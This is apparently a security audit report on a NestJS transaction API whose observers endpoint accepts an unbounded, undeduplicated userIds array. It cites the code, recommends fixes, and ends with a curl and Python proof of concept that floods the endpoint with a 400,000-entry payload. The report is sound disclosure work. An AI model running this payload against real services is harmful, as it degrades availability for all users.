### Title
`CreateTransactionObserversDto` Allows Unbounded `userIds` Array With Intra-Array Duplicates, Enabling Authenticated Resource Exhaustion

### Summary

`CreateTransactionObserversDto` enforces only a minimum array size (`@ArrayMinSize(1)`) on `userIds` but imposes no maximum. The service `createTransactionObservers` deduplicates only against already-persisted observers loaded from the database, not against repeated entries within the incoming request array itself. An authenticated transaction creator can submit a single POST request with a massive array of repeated user IDs, causing unbounded in-memory allocation and a burst of database insert attempts before the DB unique constraint fires.

### Finding Description

**Root cause 1 — No `@ArrayMaxSize` on `userIds`:**

`CreateTransactionObserversDto` accepts an arbitrarily large array bounded only by the 2 MB HTTP body limit set in `setup-app.ts`.

```
back-end/apps/api/src/transactions/dto/create-transaction-observers.dto.ts
``` [1](#0-0) 

```
back-end/apps/api/src/setup-app.ts  (line 43)
``` [2](#0-1) 

With a 2 MB limit and JSON integers separated by commas, an attacker can pack roughly 500 000+ entries into a single request.

**Root cause 2 — Intra-array duplicate check is absent:**

`createTransactionObservers` checks each incoming `userId` only against `transaction.observers` (the snapshot of already-persisted rows loaded before the loop). It never checks whether the same `userId` appears multiple times within `dto.userIds` itself.

```
back-end/apps/api/src/transactions/observers/observers.service.ts  (lines 49–54)
``` [3](#0-2) 

If `dto.userIds = [99, 99, 99, …]` and userId 99 is not yet an observer, every iteration passes the guard and pushes a new `TransactionObserver` object into the in-memory `observers` array. All N objects are then passed to `this.repo.save(observers)`.

**Exploit path:**

1. Attacker registers as a normal user, creates one transaction (becomes its creator).
2. Sends:
   ```
   POST /transactions/{id}/observers
   Authorization: Bearer <valid_jwt>
   Content-Type: application/json

   { "userIds": [99,99,99, … repeated ~500 000 times …] }
   ```
3. The service allocates ~500 000 `TransactionObserver` JS objects in memory.
4. TypeORM `repo.save(observers)` attempts to insert each one; the DB unique index on `(userId, transactionId)` rejects the second insert, throwing an error caught as `BadRequestException`.
5. The attacker receives a 400 response but the server has already performed the full in-memory allocation and at least one DB round-trip per batch.
6. The request can be repeated in a tight loop by the same user across multiple transactions they own.

**Relevant entity — unique index exists but does not prevent the in-memory phase:** [4](#0-3) 

The DB constraint prevents duplicate rows from being persisted, but it does not prevent the server from allocating the full array in memory and attempting the inserts.

**Controller entry point (authenticated, verified users only):** [5](#0-4) 

### Impact Explanation

A single 2 MB request causes the Node.js process to allocate a large array of objects (up to ~500 000 entries), perform a full iteration over them, and issue a batch DB insert. Repeated requests from one or more transaction creators can spike heap usage and DB connection load, degrading or crashing the API service for all users. This is a server-side resource exhaustion (memory + DB) triggered by a single authenticated HTTP request — not a volumetric DDoS.

### Likelihood Explanation

Any registered, verified user who has created at least one transaction satisfies the precondition. No admin or privileged role is required. The endpoint is reachable over standard HTTPS. The crafted payload is trivial to construct (a JSON array with a repeated integer). No rate-limiting on this endpoint is visible in the codebase.

### Recommendation

1. **Add `@ArrayMaxSize`** to `userIds` in `CreateTransactionObserversDto` — a reasonable upper bound is the total number of registered users, or a hard cap (e.g., 100).
2. **Deduplicate `dto.userIds` before the loop** in `createTransactionObservers`:
   ```typescript
   const uniqueUserIds = [...new Set(dto.userIds)];
   for (const userId of uniqueUserIds) { … }
   ```
3. Apply the same fix to `CreateTransactionApproversArrayDto`, which also lacks `@ArrayMaxSize`. [6](#0-5) 

### Proof of Concept

```bash
# 1. Authenticate and obtain JWT
TOKEN=$(curl -s -X POST http://localhost:3000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"password"}' \
  | jq -r '.accessToken')

# 2. Create a transaction (attacker becomes creator), capture its ID
TX_ID=<id from create response>

# 3. Build a 2 MB payload of repeated userIds
python3 -c "
import json, sys
payload = {'userIds': [99] * 400000}
sys.stdout.write(json.dumps(payload))
" > /tmp/big_payload.json

# 4. Send the crafted request
curl -X POST http://localhost:3000/transactions/$TX_ID/observers \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d @/tmp/big_payload.json
```

**Expected outcome:** The server allocates ~400 000 `TransactionObserver` objects in the Node.js heap, attempts a batch DB insert, receives a unique-constraint error, and returns HTTP 400. Heap usage spikes measurably. Repeating the request in a loop degrades API responsiveness for all concurrent users.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction-observers.dto.ts (L1-8)
```typescript
import { ArrayMinSize, IsArray, IsNumber } from 'class-validator';

export class CreateTransactionObserversDto {
  @IsArray()
  @IsNumber({}, { each: true })
  @ArrayMinSize(1)
  userIds: number[];
}
```

**File:** back-end/apps/api/src/setup-app.ts (L43-43)
```typescript
  app.use(json({ limit: '2mb' }));
```

**File:** back-end/apps/api/src/transactions/observers/observers.service.ts (L49-54)
```typescript
    for (const userId of dto.userIds) {
      if (!transaction.observers.some(o => o.userId === userId)) {
        const observer = this.repo.create({ userId, transactionId, role: Role.FULL });
        observers.push(observer);
      }
    }
```

**File:** back-end/libs/common/src/database/entities/transaction-observer.entity.ts (L19-22)
```typescript
@Entity()
@Index(['userId', 'transactionId'], { unique: true })
@Index(['transactionId'])
@Index(['userId'])
```

**File:** back-end/apps/api/src/transactions/observers/observers.controller.ts (L43-50)
```typescript
  @Post()
  createTransactionObserver(
    @GetUser() user: User,
    @Param('transactionId', ParseIntPipe) transactionId: number,
    @Body() body: CreateTransactionObserversDto,
  ): Promise<TransactionObserver[]> {
    return this.observersService.createTransactionObservers(user, transactionId, body);
  }
```

**File:** back-end/apps/api/src/transactions/dto/create-transaction-approver.dto.ts (L25-30)
```typescript
export class CreateTransactionApproversArrayDto {
  @IsArray()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approversArray: CreateTransactionApproverDto[];
}
```
